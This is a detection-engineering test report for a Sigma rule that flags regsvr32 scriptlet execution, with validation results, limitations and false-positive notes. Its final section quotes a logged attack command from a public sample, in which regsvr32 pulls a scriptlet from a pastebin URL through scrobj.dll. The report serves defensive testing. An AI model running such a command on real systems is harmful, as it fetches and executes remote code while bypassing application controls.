# Rule 015 Test Report — Regsvr32 Scriptlet Execution

## Rule Details
- **Rule file:** `rule_015_regsvr32_scriptlet.yml`
- **Detection objective:** Detect process-creation events where `regsvr32.exe` has a command line containing `/i:` or `scrobj.dll`.
- **Security relevance:** Certain uses of Regsvr32 may indicate scriptlet-based proxy execution.

## Sigma Validation
The rule passed Sigma CLI validation:
- Errors: 0
- Condition errors: 0
- Issues: 0

These results confirm that the rule passed the CLI checks; they do not establish detection effectiveness.

## Dataset Test
Three available EVTX datasets were checked for Sysmon Event ID 1 process-creation events.

| Dataset | Events checked | Matches |
|---|---:|---:|
| CA_keepass_KeeThief_Get-KeePassDatabaseKey.evtx | 0 | 0 |
| evasion_execution_imageload_wuauclt_lolbas.evtx | 2 | 0 |
| LM_PowershellRemoting_sysmon_1_wsmprovhost.evtx | 1 | 0 |
| **Total** | **3** | **0** |

## Result
No events matched the tested conditions. No examined event had an image path ending in `\regsvr32.exe` and a command line containing either `/i:` or `scrobj.dll`.

## Limitations
The test used a Python-based field-condition check rather than a Sigma detection engine or live SIEM search. Only three process-creation events were available, so these results do not establish whether the rule will reliably detect relevant activity.

## Potential False Positives
Legitimate DLL registration and approved application installation may produce similar command-line activity. Investigate alerts using process ancestry, command-line context, and the software's legitimacy.

## Recommended Next Steps
Test against suitable, authorized process-creation telemetry containing relevant Regsvr32 activity. Validate detection behavior in a supported Sigma engine or SIEM and assess potential false positives.

## Conclusion
Rule 015 passed Sigma CLI validation. No matching events were found in the available datasets. Further testing is required to assess detection effectiveness.


## Validation on public attack sample (Chainsaw v2.17.1)

- Sample: exec_sysmon_lobin_regsvr32_sct.evtx (EVTX-ATTACK-SAMPLES, copied to datasets/extra/)
- Command: chainsaw.exe --no-banner hunt datasets\extra\exec_sysmon_lobin_regsvr32_sct.evtx -s sigma_rules\rule_015_*.yml --mapping mappings\sigma-event-logs-all.yml --json
- Result: 1 detection(s)
- Event: 2019-05-12 18:35:05.140 UTC: regsvr32.exe /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll, parent cmd.exe
- Evidence: data_dictionary/evidence_rule015_extra.json
- Limitations: single public sample, no benign baseline, false-positive rate untested, not run in a live SIEM.
